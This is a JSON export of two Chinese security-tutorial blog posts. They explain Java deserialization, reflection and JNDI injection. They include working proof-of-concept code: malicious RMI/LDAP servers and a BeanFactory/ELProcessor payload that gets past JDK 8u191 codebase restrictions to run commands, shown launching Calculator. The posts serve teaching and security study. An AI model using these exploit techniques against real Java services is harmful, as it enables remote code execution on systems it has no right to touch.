{"pages":[],"posts":[{"title":"JavaSec系列 - 1. 反序列化与反射","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec1 （1）序列化与反序列化在Java中，我们创建的对象会随着其JVM的销毁而销毁。但有时，我们希望能在其他JVM、或是其他机器上复用这个对象。序列化允许我们将Java对象转换为字节流，便于存储到本地，以及通过网络发送给其他机器。而反序列化允许我们重新将序列化的字节流还原为Java对象。 我们首先来看一下序列化的实现： 123456String string1 = &quot;test&quot;;FileOutputStream fileOutputStream = new FileOutputStream(&quot;test.db&quot;);ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);objectOutputStream.writeObject(string1);objectOutputStream.close(); 这段代码中，通过调用ObjectOutputStream类的writeObject方法，我们序列化了”test”字符串对象，并将其字节流存储到本地： 1aced 0005 7400 0474 6573 74 其中，aced 0005是序列化数据的特征。 再来看一下反序列化的实现： 12345FileInputStream fileInputStream = new FileInputStream(&quot;test.db&quot;);ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);String string2 = (String) objectInputStream.readObject();System.out.println(string2);objectInputStream.close(); 这段代码调用ObjectInputStream类的readObject方法实现反序列化，恢复了”test”字符串对象。 （2）反射反射是指程序在运行过程中动态地去获取指定对象。 对于打开计算器的代码： 1Runtime.getRuntime().exec(&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); 用反射实现为： 1234Class clz = Class.forName(&quot;java.lang.Runtime&quot;);Method getRuntime = clz.getMethod(&quot;getRuntime&quot;);Runtime runtime = (Runtime) getRuntime.invoke(clz);clz.getMethod(&quot;exec&quot;, String.class).invoke(runtime, &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;); 其中，forName用于获取类，getMethod和invoke分别用于获取和执行方法。 这里我们重点讨论一下forName方法。构造这样一个类： 1234567891011package javasec1;public class ReflectionClass { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); }} 它包含一个静态初始化块static{}和一个构造方法。其中，static{}会在类加载时执行，构造方法会在类初始化时执行。 我们调用forName来获取它： 1Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;); 运行这单行代码，发现static{}被执行： 可以得知，forName查找并加载了类，但未初始化。初始化调用newInstance方法即可： 12Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;);clz.newInstance(); （3）反序列化利用反序列化的利用实际上与反射息息相关。我们来看这样两段代码：（两段代码此处需要分开运行，后面会给出解释） 123456ReflectionClass reflectionClass = new ReflectionClass();FileOutputStream fileOutputStream = new FileOutputStream(&quot;util.db&quot;);ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);objectOutputStream.writeObject(reflectionClass);objectOutputStream.close(); 1234FileInputStream fileInputStream = new FileInputStream(&quot;util.db&quot;);ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);ReflectionClass object = (ReflectionClass) objectInputStream.readObject();objectInputStream.close(); 很明显，两段代码分别对前文构造的ReflectionClass类进行了序列化与反序列化的操作。执行第一段代码，发现报错： 这是因为现在的ReflectionClass类缺乏序列化的必要条件：实现Serializable接口。于是对ReflectionClass进行修改，使其实现Serializable接口： 12345678910111213package javasec1;import java.io.Serializable;public class ReflectionClass implements Serializable { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); }} 序列化成功后，我们执行第二段代码进行反序列化： 发现static{}被执行了。据此，我们推测：readObject方法中调用了forName或其他能够加载类的方法。 于是，我们跟进readObject，果然，ObjectInputStream类的resolveClass方法调用了forName，返回了ReflectionClass类： 具体调用栈如下： 但是，此处的forName执行完后，程序并没有打印”[+] Static Constructor Method.”： 回看刚刚的forName调用，我们发现这里其第二个参数initialize是false： 而我们在反射一节执行的Class clz = Class.forName(&quot;javasec1.ReflectionClass&quot;);，实际上默认设置initialize为true： 可知，initialize的trueorfalse，决定了在forName找到目标类后，是否进行加载。 因此，ObjectInputStream类的readObject方法调用了forName得证，即反射确确实实存在于反序列化过程中。但由于initialize设置为false，static{}没有在此处执行。 那么问题来了，static{}在哪里执行的呢？ 继续跟进，最终，在ObjectStreamClass类的computeDefaultSUID方法中，找到了一个用于检查类是否有静态初始化的方法hasStaticInitializer： 就是这个方法，触发了static{}中代码的执行： 具体调用栈如下： 问题解决，现在来解释为什么刚才的序列化与反序列化操作需要分开进行。我们合起来运行看下效果： 合起来后，首先执行ReflectionClass reflectionClass = new ReflectionClass();，对类进行了加载和初始化，因此有了图中的两行输出。但按照前文对反序列化的分析来看，理应还有一行”[+] Static Constructor Method.”。 我们debug合起来的代码，发现在ObjectStreamClass类的getSerialVersionUID方法中，对类的suid是否为null进行了判断，而此时的suid并不为null，因此没能进入到doPrivileged方法中，也就没有了先前对hasStaticInitializer的调用，没有了对静态初始化的检查，也就不会打印”[+] Static Constructor Method.”。 那么，分开运行时反序列化过程中的suid应该为null才对。我们回头验证一下： 正确。 要理解其中的原因，我们首先要认识一下suid，它是JVM分发给每个可序列化类的一串数字。于是，合起来运行时，第一段代码中对ReflectionClass的初始化使得JVM“认识”了它，有了其suid的记录。而分开运行的第二段代码中，ReflectionClass对于JVM，是一个全新的存在，因此JVM会为其新生成一个suid，这个过程中，触发了类的静态初始化。 值得注意的是，分开运行生成的suid与一起运行的一致，这也体现了suid本身的目的：验证对象的唯一性。 至此，static{}在何处被执行以及序列化与反序列化过程共同、分别运行的差别，均已解释完毕，我们可以继续向下跟进。 ObjectInputStream类的readSerialData方法通过调用hasReadObjectMethod()，检查类是否重写了readObject方法，如果没有，则执行默认方法，即defaultReadFields： 我们尝试在类中重写readObject方法： 123456789101112131415161718package javasec1;import java.io.IOException;import java.io.Serializable;public class ReflectionClass implements Serializable { static { System.out.println(&quot;[+] Static Constructor Method.&quot;); } public ReflectionClass() { System.out.println(&quot;[+] Constructor Method.&quot;); } private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException { System.out.println(&quot;[+] My readObject.&quot;); }} 这里我们可以把序列化和反序列化一起运行了，结果如下： 可见重写的readObject方法被执行。再次跟进到ObjectInputStream类的readSerialData方法，发现程序进入了if分支，调用invokeReadObject方法通过反射invoke了我们重写的readObject方法。 本节输出了反射、类的静态初始化和类重写readObject方法三者在反序列化过程中的利用。至于恶意利用，你可以构造一个恶意类，尝试将反射一节开头展示的计算器代码分别写在static{}和readObject中，随后对其进行序列化与反序列化，查看效果。","link":"/2021/12/22/JavaSec%E7%B3%BB%E5%88%97-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%B0%84/"},{"title":"JavaSec系列 - 2. JNDI注入","text":"本章源码： https://github.com/hey3e/JavaSec-Code/tree/main/javasec2 命名与目录系统 (Naming and Directory services)，如RMI (Remote Method Invocation)、LDAP (Lightweight Directory Access Protocol) 等，能够以类似字典key-value的name-object形式对对象进行存储，使得我们可以通过名称来查询并访问对象。JNDI (Java Naming and Directory Interface) 便是该过程的接口。 结合上一章的知识，我们考虑在系统中存储对象序列化后的字节流，当用户进行查询时，系统返回对应的字节流，用户再进行反序列化获取对象。但在实际场景中，如果对象过大，采用该方式往往会给系统带来一定的负担。 于是，JNDI使用Naming References的方式进行存储，此时，name-object中的object并非对象本身，而是对象的引用Reference，其中包含对象名及其真正被存放的地址codebase。当用户进行查询时，系统返回Reference，用户解析后再从codebase获取对象。不过这里说的不太严谨，后面会进行补充。 不过，上述从远程codebase加载对象的方式存在许多安全问题，随着jdk版本的迭代，系统对codebase已逐渐不再信任，JNDI受到越来越多的限制。我们下面看一下各版本下JNDI如何实现。 （1）jdk&lt;8u121 (RMI+JNDI)首先，构造要查询的目标类TargetClass： 123456789public class TargetClass { static { System.out.println(&quot;[+] Server Static Constructor Method.&quot;); } public TargetClass() { System.out.println(&quot;[+] Server Constructor Method.&quot;); }} javac编译，并挂到python的简易服务器上： 下面编写RMI服务器的代码： 1234567891011121314public class RMIServer { public static void main(String[] args) throws Exception{ //a Registry registry = LocateRegistry.createRegistry(1099); //b String FactoryURL = &quot;http://127.0.0.1:4444/&quot;; Reference reference = new Reference(&quot;ReferenceClass&quot;,&quot;TargetClass&quot;, FactoryURL); ReferenceWrapper wrapper = new ReferenceWrapper(reference); //c registry.bind(&quot;Target&quot;, wrapper); }} 其中： a处，创建RMI服务，监听1099端口。 b处，构造Reference，codebase为前文的python服务器，对象为TargetClass类。 c处，进行存储，name为Target，object为Reference。 接下来，编写Client查询代码： 123456public class RMIClient { public static void main(String[] args) throws Exception{ Context ctx = new InitialContext(); ctx.lookup(&quot;rmi://127.0.0.1:1099/Target&quot;); }} 注意，Client与TargetClass需要在不同的project中，后面会同本文开头的“不严谨”一起给出解释。这里我们使用InitialContext类的lookup方法向RMI系统进行查询。 运行Server后运行Client，发现TargetClass类的两段代码都被执行，同时服务器收到了一条GET请求： 开始跟进lookup。InitialContext类的lookup方法首先调用了getURLOrDefaultInitCtx获取到基于URL scheme的Context，此处是基于rmi的RegistryContext： 继续调用两个lookup后，来到RegistryContext类的decodeObject方法，此时Client已经获取到了目标对象的Reference： 接着，在NamingManager类的getObjectInstance方法中，对Reference进行了处理，传入getObjectFactoryFromReference方法： 此处处理后的Reference如下，与RMI系统中设置的一致： 其中，className为自定的类名，classFactory为目标类名，classFactoryLocation为codebase。 在getObjectFactoryFromReference方法中，程序分别尝试了从本地和codebase两处加载TargetClass： 最终，程序选择了codebase的loadClass，并在其中调用了我们熟悉的forName： 不仅如此，getObjectFactoryFromReference还调用了newInstance方法完成了对TargetClass的初始化，至此，RMI上的JNDI完成： 在jdk&gt;8u121的环境下使用上述RMI+JNDI时，我们发现Client报错： 可见高版本RMI默认已不信任codebase。为绕过该限制，我们可以转向LDAP+JNDI。 （2）jdk&lt;8u191 (LDAP+JNDI)这里，我们方便的用marshalsec启动一个LDAP服务器： 修改Client代码中的URL scheme为ldap，端口为1389: 123456public class RMIClient { public static void main(String[] args) throws Exception{ Context ctx = new InitialContext(); ctx.lookup(&quot;ldap://127.0.0.1:1389/Target&quot;); }} 运行，成功加载并初始化TargetClass，LDAP上的JNDI完成： 跟进lookup方法，流程与RMI类似。 （3）JNDI注入同样，marshalsec也可以启动RMI服务器： 其中，JRMP (Java Remote Method Protocol) 远程方法协议，是用于RMI过程中的协议。 运行Client，可以得到与前文同样的结果。 marshalsec与我们自己编写的RMI服务器之间的不同之处在于，如果你向我们编写的RMI服务器查询一个不存在的对象Foo： 1ctx.lookup(&quot;rmi://127.0.0.1:1097/Foo&quot;); 程序会报NameNotFound错误： 这是因为我们的RMI服务器上并未存储名为Foo的Reference。 若向marshalsec的RMI服务器查询，成功： 这是因为marshalsec实际上是利用socket自定义了一个RMI服务器，当收到rmi的lookup请求时，服务器会调用handleRMI方法进行处理： 其中，我们提供的参数 http://127.0.0.1:4444/#TargetClass 会被直接包装成Reference返回。即无论Client查询谁，服务器返回的都是我们设计的Reference。因此JNDI一定成功。 marshalsec的LDAP服务器同理，当收到ldap的lookup请求时，调用sendResult方法，返回我们设计的Reference： 上面所讲均是JNDI的使用。试想如果我们能够控制目标lookup方法的参数，使其向由我们启动的服务器发起查询，以返回一个指定的恶意Reference，就可以达到远程代码执行的效果。这类攻击就叫做JNDI注入。 下面是来自 https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf 的两类JNDI注入示意图： （4）jdk&gt;8u191在jdk8u191+的环境中，LDAP默认也已不再信任codebase。至此，已难以通过远程加载codebase的方式实现JNDI注入。 下面我们先来填一下前文“不严谨”和“不同project”的坑。 我们切回到jdk&lt;8u121的环境下，并在Client的目录下也构造一个TargetClass，使其实现ObjectFactory接口和getObjectInstance方法： 12345678910111213141516171819import javax.naming.Context;import javax.naming.Name;import javax.naming.spi.ObjectFactory;import java.util.Hashtable;public class TargetClass implements ObjectFactory { static { System.out.println(&quot;[+] Client's Static Constructor Method.&quot;); } public TargetClass() { System.out.println(&quot;[+] Client's Constructor Method.&quot;); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception { return null; }} 还有一点不同，这里我们打印的是”Client…”，而codebase下的TargetClass打印的是”Server…”。 复现RMI+JNDI，查看结果： 可知Client这次拿到的是本地的TargetClass。跟进，再次来到getObjectFactoryFromReference方法，发现这次程序选择了从本地进行加载： 于是，我们可以补充一下文章开头的JNDI知识点：当用户进行查询时，系统返回Reference，用户会先在本地ClassPath中查找该对象，若没有，再去codebase处获取。 综上，我们考虑：既然高版本jdk限制了从codebase获取类，我们就尝试通过利用本地ClassPath中已有的类来实现JNDI注入。 首先，这个类需要实现了ObjectFactory接口和getObjectInstance方法，在Apache Tomcat中，我们找到了符合条件的org.apache.naming.factory.BeanFactory类： 回头debug本地类的JNDI，我们看到该类实现的getObjectInstance方法会被调用： 于是我们下面来看org.apache.naming.factory.BeanFactory类的getObjectInstance方法有什么值得利用的地方。 可见，它会处理ResourceRef类的Reference，加载并初始化名为Reference中className字段的类。由此我们得知，className指定的类必须本地存在且有无参构造方法。 继续向下： 这一段，我们了解到方法获取Reference中”forceString”属性的值并用’=’进行分隔，等号左边成为哈希表forced的一个key，其value是className指定的类中名为等号右边的方法。如”forceString”为”x=y”，则”x”将存为key，value为y方法。注意，此方法的参数paramTypes为一个String类型，所以我们要找的className指定的类中需要有这样一个方法。 继续向下： 这里，方法遍历Reference的所有属性，对type不为if中指定的值的属性，获取其content，并利用反射invoke了className类中名为type在forced中对应的value的方法，且参数为content。沿续上文的举例，若在Reference中添加type为”x”的属性，则y方法最终将被反射调用。 综上所述，可见如果我们能找到一个符合要求的className类并精心构造一个Reference，通过Client从本地加载org.apache.naming.factory.BeanFactory类并执行getObjectInstance方法，有希望借助反射实现JNDI注入。 最终，我们找到了javax.el.ELProcessor类，它满足我们之前提出的要求： 存在于Tomcat依赖包中。 有无参构造方法。 有eval方法，其参数为一个String类型。 同时，在设计Reference时，我们需要注意，在jdk8u121+的环境中，是这样检查的codebase的信任问题的： 在RegistryContext类的decodeObject方法中，对trustURLCodebase的trueorfalse进行了检查。观察判断条件，我们可以通过设置Reference的factoryLocation，也就是codebase，为null的方式进行绕过，从而成功进入getObjectInstance方法。 接下来，根据已上思路，我们编写RMI服务器来返回恶意Reference： 12345678910111213public class RMIServer191 { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1097); ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null); ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;)); ref.add(new StringRefAddr(&quot;x&quot;, &quot;\\&quot;\\&quot;.getClass().forName(\\&quot;javax.script.ScriptEngineManager\\&quot;).&quot; + &quot;newInstance().getEngineByName(\\&quot;JavaScript\\&quot;).&quot; + &quot;eval(\\&quot;java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator')\\&quot;)&quot;)); ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref); registry.bind(&quot;Object&quot;, referenceWrapper); }} 其中，”x”属性的content，作为参数传入eval方法后，会被解析成EL表达式从而达到命令执行的效果。 运行Client，弹出计算器，JNDI注入成功： 跟进lookup，可以对org.apache.naming.factory.BeanFactory类的getObjectInstance方法是如何处理Reference的有一个更深的理解。 至此，我们了解了不同环境下JNDI注入的绕过与实现： jdk&lt;8u121：RMI+codebase。 jdk&lt;8u191：LDAP+codebase。 jdk&gt;8u191：BeanFactory+本地ClassPath。","link":"/2021/12/29/JavaSec%E7%B3%BB%E5%88%97-2-JNDI%E6%B3%A8%E5%85%A5/"}],"tags":[{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"反射","slug":"反射","link":"/tags/%E5%8F%8D%E5%B0%84/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"}],"categories":[{"name":"JavaSec","slug":"JavaSec","link":"/categories/JavaSec/"}]}